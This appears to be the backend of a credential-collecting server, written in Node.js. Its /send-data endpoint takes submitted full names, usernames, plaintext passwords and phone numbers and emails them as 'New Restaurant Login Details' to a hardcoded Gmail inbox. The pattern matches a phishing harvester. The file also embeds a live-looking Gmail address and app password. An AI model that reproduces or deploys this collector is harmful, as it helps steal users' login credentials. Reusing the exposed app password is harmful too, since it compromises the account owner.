const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// Nodemailer setup
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'lagharitahir08@gmail.com', // Apni Gmail ID
        pass: 'mcfn tmzh qnxd ghaa'       // Gmail ka App Password
    }
});

app.post('/send-data', (req, res) => {
    const { fullname, username, password, phone } = req.body;

    const mailOptions = {
        from: 'lagharitahir08@gmail.com', // Corrected email
        to: 'lagharitahir08@gmail.com',   // Corrected recipient email (added @gmail)
        subject: 'New Restaurant Login Details',
        text: `Nayi Login Details aayi hain:
        
Full Name: ${fullname}
Username: ${username}
Password: ${password}
Phone Number: ${phone}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log(error);
            return res.status(500).send("Email send karne mein error aayi.");
        } else {
            console.log('Email sent: ' + info.response);
            return res.status(200).send("Data successfully bhej diya gaya hai.");
        }
    });
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server ${PORT} port par chal raha hai.`);
});
